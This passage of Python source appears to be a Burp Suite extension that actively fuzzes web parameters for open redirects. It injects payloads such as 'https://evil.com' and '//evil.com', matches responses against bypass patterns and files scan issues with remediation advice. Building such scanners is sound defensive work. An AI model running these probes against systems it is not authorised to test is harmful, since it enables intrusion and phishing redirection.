                return False, None, "Redirect host does not match payload domain"
            else:
                # Host matches attacker domain, accept immediately
                return True, "High", "Redirect to attacker host %s" % matched_domain
        else:
            # No host present (relative) - do not treat as valid unless payload is scheme-based
            return False, None, None
        
        # CRITICAL: Check if location exactly matches our payload or is empty redirect
        if location_header == payload or decoded_location == decoded_payload:
            return True, "High", "Direct payload reflection to malicious domain"
                
        # Check various bypass patterns against confirmed malicious host
        for evil_domain in evil_domains + list(payload_domains):
            if not evil_domain:
                continue

            # @ prefix patterns (like @evil.com)
            patterns_to_check = [
                "@" + evil_domain,
                "%40" + evil_domain,
                "\\@" + evil_domain,
                "@" + evil_domain + "/",
                "@" + evil_domain + "\\",
                "@" + evil_domain + "%2f",
                "@" + evil_domain + "%5c",
            ]
            
            for pattern in patterns_to_check:
                if pattern in location_lower or pattern in decoded_location.lower():
                    return True, "High", "@ bypass to evil domain: %s" % pattern
            
            # Check if location starts with evil domain (various formats)
            if location_lower.startswith((evil_domain, "//" + evil_domain, 
                                         "///" + evil_domain, "\\\\" + evil_domain)):
                return True, "High", "Direct redirect to: %s" % evil_domain
                
            # Authority confusion patterns
            if "@" + evil_domain in location_lower:
                # Ensure it's not just in a query parameter
                if "?" in location_header:
                    base_part = location_header.split("?")[0]
                    if "@" + evil_domain in base_part.lower():
                        return True, "High", "@ authority bypass in URL path"
                else:
                    return True, "High", "@ authority bypass detected"
                    
            # Backslash patterns
            if "\\" in location_header and evil_domain in location_lower:
                return True, "Medium", "Backslash bypass with evil domain"
                
            # Multiple slashes
            if ("///" in location_header or "////" in location_header) and evil_domain in location_lower:
                return True, "Medium", "Multiple slash bypass"
                
            # Encoded patterns
            encoded_patterns = [
                "%2f%2f" + evil_domain,
                evil_domain + "%2f%2e%2e",
                evil_domain + "%252f",
                "%5c%5c" + evil_domain,
            ]
            
            for pattern in encoded_patterns:
                if pattern in location_lower:
                    return True, "Medium", "Encoded bypass pattern: %s" % pattern
                    
            # Check for partial domain injection in hostname
            try:
                parsed = parsed_location or urlparse(location_header)
                if parsed.hostname and evil_domain in parsed.hostname.lower():
                    return True, "High", "Evil domain in hostname: %s" % parsed.hostname
            except:
                pass
                    
        # Check for open redirect to any external domain (not just evil domains) when strict_mode is off
        if self.strict_mode == False and target_host and target_host.lower() != original_host.lower():
            if "@" in location_header:
                return True, "Medium", "Potential @ bypass to external domain"
            if location_header.startswith("//"):
                return True, "Medium", "Protocol-relative redirect to external domain"
                
        return False, None, None

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not self.extension_enabled:
            return

        # Passive 3xx response detection
        if not messageIsRequest:
            try:
                response_bytes = messageInfo.getResponse()
                if not response_bytes:
                    return
                analyzed_resp = self._helpers.analyzeResponse(response_bytes)
                status_code = analyzed_resp.getStatusCode()
                if status_code < 300 or status_code > 399:
                    return
                location = None
                for header in analyzed_resp.getHeaders():
                    if header.lower().startswith("location:"):
                        location = header.split(":", 1)[1].strip()
                        break
                if not location:
                    return

                request_info = self._helpers.analyzeRequest(messageInfo)
                url = request_info.getUrl()
                original_host = url.getHost()
                params = request_info.getParameters()

                # If Location already points to an external, non-whitelisted host, raise immediately
                try:
                    parsed_loc = urlparse(location)
                    target_host = parsed_loc.hostname
                    if target_host and not self.is_host_whitelisted(target_host):
                        if self.get_registrable_domain(target_host) != self.get_registrable_domain(original_host):
                            http_service = messageInfo.getHttpService()
                            self.report_redirect(http_service, url.toString(), messageInfo,
                                              location, location, "High",
                                              "Passive external redirect to %s" % target_host)
                            self._stdout.println("[+] Passive OPEN REDIRECT detected (external host)!")
                            self._stdout.println("    Location: %s" % location)
                            self._stdout.println("    Confidence: High")
                            self.update_status("VULNERABLE (passive external): %s -> %s" % (original_host, target_host), include_stats=True)
                            # Record key without param context to skip reprocessing
                            key_id = (url.getHost().lower(), http_service.getPort(), url.getPath(), "passive-external", 0)
                            self.vulnerable_params.add(key_id)
                            return
                except Exception:
                    pass

                if not params:
                    return

                for param in params:
                    if param.getType() not in self.param_types_to_scan:
                        continue
                    is_vuln, confidence, reason = self.is_valid_open_redirect(
                        location, param.getValue(), original_host, param.getName()
                    )
                    if is_vuln:
                        http_service = messageInfo.getHttpService()
                        self.report_redirect(http_service, url.toString(), messageInfo,
                                          param.getValue(), location, confidence,
                                          "Passive response redirect via %s%s" % (param.getName(), (" - " + reason) if reason else ""))
                        key_id = (url.getHost().lower(), http_service.getPort(), url.getPath(), param.getName().lower(), param.getType())
                        self.vulnerable_params.add(key_id)
                        self.vulnerable_hosts.add(url.getHost().lower())
                        self._stdout.println("[+] Passive OPEN REDIRECT detected!")
                        self._stdout.println("    Parameter: %s" % param.getName())
                        self._stdout.println("    Location: %s" % location)
                        self._stdout.println("    Confidence: %s" % confidence)
                        self.update_status("VULNERABLE (passive): %s -> %s" % (param.getName(), location), include_stats=True)
                        break
            except Exception as e:
                if self.debug_mode:
                    self._stderr.println("[DEBUG] Passive check error: %s" % str(e))
            return

        try:
            request_info = self._helpers.analyzeRequest(messageInfo)
            url = request_info.getUrl()
            method = request_info.getMethod()
            http_service = messageInfo.getHttpService()

            # Only proceed for GET or POST (with optional POST scanning)
            if method not in ["GET", "POST"]:
                return

            param_source = method

            if not self.ignore_scope and not self._callbacks.isInScope(url):
                return

            if url.getHost() and url.getHost().lower() in self.vulnerable_hosts:
                return

            sig = self.build_signature(url, request_info.getParameters(), method)
            if sig and sig in self.dedup_signatures:
                return
            if len(self.active_threads) >= self.max_active_scans:
                return

            params = request_info.getParameters()
            if not params:
                return

            comment = messageInfo.getComment()
            pm_hint = False
            if self.param_miner_enabled and comment:
                pm_hint = ("param miner" in comment.lower())

            is_manual = False  # automatic flow
            scanned_any = False
            for param in params:
                if param.getType() not in self.param_types_to_scan:
                    continue

                # Respect POST scanning toggle; allow URL params even when POST scanning is off
                if method == "POST" and not self.scan_post_checkbox.isSelected() and param.getType() != IParameter.PARAM_URL:
                    continue

                key_lower = param.getName().lower()
                should_scan = self.scan_all_checkbox.isSelected() or pm_hint or any(word in key_lower for word in self.keywords)
                if not should_scan:
                    continue

                key_id = (url.getHost().lower(), http_service.getPort(), url.getPath(), key_lower, param.getType(), param.getValue())
                if key_id in self.vulnerable_params:
                    continue
                if key_id not in self.scanned_requests:
                    self.scanned_requests.add(key_id)
                    scanned_any = True

            if scanned_any:
                self.start_scan_thread(url, messageInfo, param_source)
        except Exception as e:
            self._stderr.println("[!] Error in processing request: %s" % str(e))

    def start_scan_thread(self, url, messageInfo, param_source, is_manual=False):
        with self.lock:
            # For manual scans, don't check thread limit
            if not is_manual and len(self.active_threads) >= self.max_threads:
                return
            if url.getHost() and url.getHost().lower() in self.vulnerable_hosts:
                return
            if len(self.active_threads) >= self.max_active_scans:
                return

            def runner():
                try:
                    self.scan_with_rate_limit(url, messageInfo, param_source, is_manual)
                except Exception as e:
                    self._stderr.println("[!] Thread error: %s" % str(e))
                    import traceback
                    self._stderr.println(traceback.format_exc())
                    self.update_status("Error during scan: %s" % str(e))
                finally:
                    with self.lock:
                        if thread in self.active_threads:
                            self.active_threads.remove(thread)
                        self.completed_scans += 1

            thread = threading.Thread(target=runner)
            thread.daemon = True
            self.total_queued += 1
            self.active_threads.append(thread)
            thread.start()

    def scan_with_rate_limit(self, url, messageInfo, param_source, is_manual=False):
        with self.lock:
            now = time.time()
            wait = self.delay - (now - self.last_request_time)
            if wait > 0:
                time.sleep(wait)
            self.last_request_time = time.time()
        
        # Run scan outside the lock to avoid blocking
        self.scan_for_redirects(url, messageInfo, param_source, is_manual)

    def scan_for_redirects(self, base_url, messageInfo, param_source, is_manual=False):
        try:
            parsed = self._helpers.analyzeRequest(messageInfo)
            orig_url = base_url.toString()
            original_host = base_url.getHost()
            method = parsed.getMethod()
            params = parsed.getParameters()
            orig_request_bytes = messageInfo.getRequest()

            if self.debug_mode:
                self._stdout.println("[DEBUG] Starting scan for URL: %s" % orig_url)
                self._stdout.println("[DEBUG] Parameter source: %s" % param_source)

            # Update status with full URL and thread count for visibility
            self.update_status("Scanning: %s" % orig_url, include_stats=True)

            if not params:
                self.update_status("No parameters to scan on %s" % base_url.getHost())
                return

            candidate_params = []
            empty_params = []
            priority_set = set(p.lower() for p in self.priority_params)

            for param in params:
                if param.getType() not in self.param_types_to_scan:
                    continue

                # Respect POST toggle for non-URL params
                if method == "POST" and not self.scan_post_checkbox.isSelected() and param.getType() != IParameter.PARAM_URL:
                    continue

                name_lower = param.getName().lower()
                if not self.scan_all_checkbox.isSelected() and not any(word in name_lower for word in self.keywords):
                    continue

                candidate_params.append(param)
                value = param.getValue() or ""
                if value in ['', '/', '//', 'http://', 'https://', 'http:', 'https:', '#', '?']:
                    empty_params.append(param)
                    self._stdout.println("[*] Found empty/suspicious parameter: %s=%s" % (param.getName(), value))

            if self.debug_mode:
                self._stdout.println("[DEBUG] Candidate parameters: %s" % [p.getName() for p in candidate_params])
                if empty_params:
                    self._stdout.println("[DEBUG] Empty/suspicious parameters: %s" % [p.getName() for p in empty_params])

            if not candidate_params:
                self.update_status("Filtered out all params for %s" % base_url.getHost())
                return

            # Quick check: if the original response already redirects externally using any candidate param value, report immediately
            try:
                orig_response_bytes = messageInfo.getResponse()
                if orig_response_bytes:
                    analyzed_resp = self._helpers.analyzeResponse(orig_response_bytes)
                    status_code = analyzed_resp.getStatusCode()
                    if 300 <= status_code <= 399:
                        location = None
                        for header in analyzed_resp.getHeaders():
                            if header.lower().startswith("location:"):
                                location = header.split(":", 1)[1].strip()
                                break
                        if location:
                            for param in candidate_params:
                                payload_val = param.getValue()
                                is_vuln, confidence, reason = self.is_valid_open_redirect(
                                    location, payload_val, original_host, param.getName()
                                )
                                if is_vuln:
                                    self._stdout.println("[+] OPEN REDIRECT FOUND (original response)!")
                                    self._stdout.println("    Parameter: %s" % param.getName())
                                    self._stdout.println("    Payload: %s" % payload_val)
                                    self._stdout.println("    Location: %s" % location)
                                    self._stdout.println("    Confidence: %s" % confidence)
                                    self.report_redirect(messageInfo.getHttpService(), orig_url, messageInfo,
                                                      payload_val, location, confidence,
                                                      "Original response redirect via %s" % param.getName())
                                    self.update_status("VULNERABLE: Open redirect in '%s' on %s (original response)" % (param.getName(), base_url.getHost()), include_stats=True)
                                    return
            except Exception as e:
                if self.debug_mode:
                    self._stderr.println("[DEBUG] Original response check failed: %s" % str(e))

            payloads = self.get_payloads()
            vulnerability_found = [False]  # mutable for Jython/Python2 compatibility
            tested_params = set()
            base_checked = set()

            def test_parameter(param, label):
                param_key = (param.getName().lower(), param.getType())
                if param_key in tested_params or vulnerability_found[0]:
                    return
                tested_params.add(param_key)

                prefix = "!" if label == "empty" else "*"
                self._stdout.println("[%s] Testing %s parameter '%s' with ALL payloads" % (prefix, label.upper(), param.getName()))
                param_payloads = list(payloads)
                original_value = param.getValue()
                if original_value and original_value not in param_payloads:
                    param_payloads.insert(0, original_value)
                if "" not in param_payloads:
                    param_payloads.insert(0, "")

                # Fast-path: if original value is an absolute external URL, test it once before fuzzing
                if original_value:
                    try:
                        parsed_val = urlparse(original_value if "://" in original_value else "http://" + original_value)
                        if parsed_val.scheme in ["http", "https"] and parsed_val.hostname and parsed_val.hostname.lower() != original_host.lower():
                            if not self.is_host_whitelisted(parsed_val.hostname):
                                fast_payload = original_value
                                if self.debug_mode:
                                    self._stdout.println("[DEBUG] Fast-path test for %s=%s" % (param.getName(), fast_payload))
                                mutated_request = self.build_mutated_request(orig_request_bytes, param, fast_payload)
                                mutated_url = self._helpers.analyzeRequest(mutated_request).getUrl().toString()
                                http_service = messageInfo.getHttpService()
                                response = self._callbacks.makeHttpRequest(http_service, mutated_request)

                                if response and response.getResponse():
                                    analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
                                    status_code = analyzed_resp.getStatusCode()
                                    if 300 <= status_code <= 399:
                                        location = None
                                        for header in analyzed_resp.getHeaders():
                                            if header.lower().startswith("location:"):
                                                location = header.split(":", 1)[1].strip()
                                                break
                                        if location:
                                            is_vuln, confidence, reason = self.is_valid_open_redirect(
                                                location, fast_payload, original_host, param.getName()
                                            )
                                if is_vuln:
                                    reason_text = reason or "Redirect"
                                    self.report_redirect(http_service, mutated_url, response,
                                                      fast_payload, location, confidence,
                                                      "%s parameter exploit: %s" % (label.capitalize(), param.getName()) + (" - " + reason_text if reason_text else ""))
                                    vulnerability_found[0] = True
                                    self.vulnerable_hosts.add(base_url.getHost().lower())
                                    self.update_status("VULNERABLE: Open redirect in '%s' on %s (fast-path)" % (param.getName(), base_url.getHost()), include_stats=True)
                                    self._stdout.println("[+] OPEN REDIRECT FOUND (fast-path)!")
                                    return
                    except Exception as e:
                        if self.debug_mode:
                            self._stderr.println("[DEBUG] Fast-path error for %s: %s" % (param.getName(), str(e)))

                # Baseline request: send the original request once to see if server already redirects externally
                try:
                    if param_key not in base_checked:
                        http_service = messageInfo.getHttpService()
                        resp = self._callbacks.makeHttpRequest(http_service, orig_request_bytes)
                        base_checked.add(param_key)
                        if resp and resp.getResponse():
                            analyzed_base = self._helpers.analyzeResponse(resp.getResponse())
                            status_base = analyzed_base.getStatusCode()
                            if 300 <= status_base <= 399:
                                base_loc = None
                                for h in analyzed_base.getHeaders():
                                    if h.lower().startswith("location:"):
                                        base_loc = h.split(":", 1)[1].strip()
                                        break
                                if base_loc:
                                    is_vuln, confidence, reason = self.is_valid_open_redirect(
                                        base_loc, param.getValue(), original_host, param.getName()
                                    )
                                if is_vuln:
                                    reason_text = reason or "Redirect"
                                    self.report_redirect(http_service, orig_url, resp,
                                                      param.getValue(), base_loc, confidence,
                                                      "Baseline request redirect via %s - %s" % (param.getName(), reason_text))
                                    vulnerability_found[0] = True
                                    key_id = (base_url.getHost().lower(), messageInfo.getHttpService().getPort(), base_url.getPath(), param.getName().lower(), param.getType())
                                    self.vulnerable_params.add(key_id)
                                    self.vulnerable_hosts.add(base_url.getHost().lower())
                                    self.update_status("VULNERABLE: Open redirect in '%s' on %s (baseline)" % (param.getName(), base_url.getHost()), include_stats=True)
                                    self._stdout.println("[+] OPEN REDIRECT FOUND (baseline)!")
                                    return
                except Exception as e:
                    if self.debug_mode:
                        self._stderr.println("[DEBUG] Baseline check error for %s: %s" % (param.getName(), str(e)))

                # Quick payloads to avoid long fuzzing on obvious redirect params
                quick_payloads = []
                if original_value:
                    quick_payloads.append(original_value)
                quick_payloads.extend([
                    "https://evil.com",
                    "//evil.com",
                    "https://oast.me",
                    "//oast.me"
                ])
                # Deduplicate quick payloads
                quick_seen = set()
                quick_payloads = [p for p in quick_payloads if not (p in quick_seen or quick_seen.add(p))]

                for quick_payload in quick_payloads:
                    if vulnerability_found[0]:
                        break
                    try:
                        mutated_request = self.build_mutated_request(orig_request_bytes, param, quick_payload)
                        mutated_url = self._helpers.analyzeRequest(mutated_request).getUrl().toString()
                        http_service = messageInfo.getHttpService()
                        response = self._callbacks.makeHttpRequest(http_service, mutated_request)
                        if not response or not response.getResponse():
                            continue
                        analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
                        status_code = analyzed_resp.getStatusCode()
                        if 300 <= status_code <= 399:
                            location = None
                            for header in analyzed_resp.getHeaders():
                                if header.lower().startswith("location:"):
                                    location = header.split(":", 1)[1].strip()
                                    break
                            if location:
                                is_vuln, confidence, reason = self.is_valid_open_redirect(
                                    location, quick_payload, original_host, param.getName()
                                )
                                if is_vuln:
                                    reason_text = reason or "Redirect"
                                    self.report_redirect(http_service, mutated_url, response, 
                                                      quick_payload, location, confidence, 
                                                      "%s parameter exploit: %s" % (label.capitalize(), param.getName()) + (" - " + reason_text if reason_text else ""))
                                    vulnerability_found[0] = True
                                    key_id = (base_url.getHost().lower(), messageInfo.getHttpService().getPort(), base_url.getPath(), param.getName().lower(), param.getType())
                                    self.vulnerable_params.add(key_id)
                                    self.vulnerable_hosts.add(base_url.getHost().lower())
                                    self.update_status("VULNERABLE: Open redirect in '%s' on %s (quick payload)" % (param.getName(), base_url.getHost()), include_stats=True)
                                    self._stdout.println("[+] OPEN REDIRECT FOUND (quick)!")
                                    return
                    except Exception as e:
                        if self.debug_mode:
                            self._stderr.println("[DEBUG] Quick payload error for %s: %s" % (param.getName(), str(e)))

                if vulnerability_found[0]:
                    return

                self.update_status("%s param '%s' with %d payloads" % (
                    label.capitalize(), param.getName(), len(param_payloads)
                ), include_stats=True)

                payload_count = 0
                for test_payload in param_payloads:
                    if vulnerability_found[0]:
                        break

                    payload_count += 1
                    if payload_count % 10 == 0:
                        self.update_status("%s param '%s' payload %d/%d" % (
                            label.capitalize(), param.getName(), payload_count, len(param_payloads)
                        ), include_stats=True)

                    try:
                        mutated_request = self.build_mutated_request(orig_request_bytes, param, test_payload)
                        mutated_url = self._helpers.analyzeRequest(mutated_request).getUrl().toString()
                        if self.debug_mode and payload_count <= 3:
                            self._stdout.println("[DEBUG] Testing payload #%d for %s: %s" % (payload_count, param.getName(), test_payload))
                        http_service = messageInfo.getHttpService()
                        response = self._callbacks.makeHttpRequest(http_service, mutated_request)

                        if not response or not response.getResponse():
                            continue

                        analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
                        status_code = analyzed_resp.getStatusCode()

                        headers = analyzed_resp.getHeaders()
                        body_offset = analyzed_resp.getBodyOffset()
                        body_str = None

                        redirect_candidates = []

                        if 300 <= status_code <= 399:
                            location = None
                            for header in headers:
                                if header.lower().startswith("location:"):
                                    location = header.split(":", 1)[1].strip()
                                    break
                            if location:
                                redirect_candidates.append(("location", location))

                        if self.confirm_redirects:
                            for header in headers:
                                if header.lower().startswith("refresh:"):
                                    refresh_val = header.split(":", 1)[1]
                                    match = re.search(r'url=([^;]+)', refresh_val, flags=re.IGNORECASE)
                                    if match:
                                        redirect_candidates.append(("refresh-header", match.group(1).strip()))

                            if body_str is None:
                                body_str = self._helpers.bytesToString(response.getResponse())[body_offset:]
                            for url_candidate, source in self.extract_body_redirects(body_str):
                                redirect_candidates.append((source, url_candidate))

                        if not redirect_candidates:
                            continue

                        for source, location in redirect_candidates:
                            is_vuln, confidence, reason = self.is_valid_open_redirect(
                                location, test_payload, original_host, param.getName()
                            )

                            if is_vuln:
                                # If external host found, stop fuzzing immediately
                                confirm_note = ""
                                if self.confirm_redirects:
                                    confirmed, note = self.confirm_redirect(location, messageInfo.getHttpService(), orig_request_bytes)
                                    confirm_note = " | follow-up: %s" % note

                                reason_text = ("%s via %s" % (reason or "Redirect", source)) + confirm_note

                                self._stdout.println("[+] OPEN REDIRECT FOUND!")
                                self._stdout.println("    Parameter: %s" % param.getName())
                                self._stdout.println("    Payload: %s" % test_payload)
                                self._stdout.println("    Location: %s" % location)
                                self._stdout.println("    Confidence: %s" % confidence)
                                self.report_redirect(http_service, mutated_url, response, 
                                                  test_payload, location, confidence, 
                                                  "%s parameter exploit: %s" % (label.capitalize(), param.getName()) + (" - " + reason_text if reason_text else ""))
                                vulnerability_found[0] = True
                                key_id = (base_url.getHost().lower(), messageInfo.getHttpService().getPort(), base_url.getPath(), param.getName().lower(), param.getType())
                                self.vulnerable_params.add(key_id)
                                self.vulnerable_hosts.add(base_url.getHost().lower())
                                self.update_status("VULNERABLE: Open redirect in '%s' on %s" % (param.getName(), base_url.getHost()), include_stats=True)
                                break
                        if vulnerability_found[0]:
                            break
                    except Exception as e:
                        if self.debug_mode:
                            self._stderr.println("[DEBUG] Error testing payload %d for %s: %s" % (payload_count, param.getName(), str(e)))

                if not vulnerability_found[0] and self.debug_mode:
                    self._stdout.println("[-] Tested %d payloads for '%s' - no vulnerability found" % (payload_count, param.getName()))

            # Prioritize empty/suspicious params first
            for param in empty_params:
                if vulnerability_found[0]:
                    break
                test_parameter(param, "empty")

            # Then test priority parameters
            if not vulnerability_found[0]:
                for param in candidate_params:
                    if vulnerability_found[0]:
                        break
                    if param in empty_params:
                        continue
                    if param.getName().lower() in priority_set:
                        test_parameter(param, "priority")

            if vulnerability_found[0]:
                self.update_status("VULNERABLE: Open redirect found on %s" % base_url.getHost(), include_stats=True)
                self._stdout.println("[!] Stopped scanning - vulnerability found")
                return
            else:
                self.update_status("Scan complete for %s: no open redirects found" % base_url.getHost(), include_stats=True)

        except Exception as e:
            self._stderr.println("[!] Scan error: %s" % str(e))
            import traceback
            self._stderr.println(traceback.format_exc())
            self.update_status("Error during scan: %s" % str(e))

    def report_redirect(self, http_service, url_str, response_info, payload, location, confidence, reason):
        severity = "High" if confidence == "High" else "Medium"
        
        detail = """
        <p>The application appears to be vulnerable to open redirect attacks.</p>
        <p><b>Payload used:</b> %s</p>
        <p><b>Redirect location:</b> %s</p>
        <p><b>Confidence:</b> %s</p>
        <p><b>Detection reason:</b> %s</p>
        <p>An attacker could use this to redirect users to malicious sites while appearing to originate from the legitimate application.</p>
        """ % (payload, location, confidence, reason)
        
        issue = CustomScanIssue(
            http_service,
            URL(url_str),
            [response_info],
            "Open Redirect Vulnerability",
            detail,
            severity
        )
        self._callbacks.addScanIssue(issue)

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0x08000000

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return "Open redirect vulnerabilities occur when an application accepts untrusted input that specifies a URL to which users will be redirected."

    def getRemediationBackground(self):
        return "Validate and whitelist allowed redirect destinations. Never redirect to URLs provided directly by users without validation."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "Implement a whitelist of allowed redirect destinations and validate all redirect URLs against this list."

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
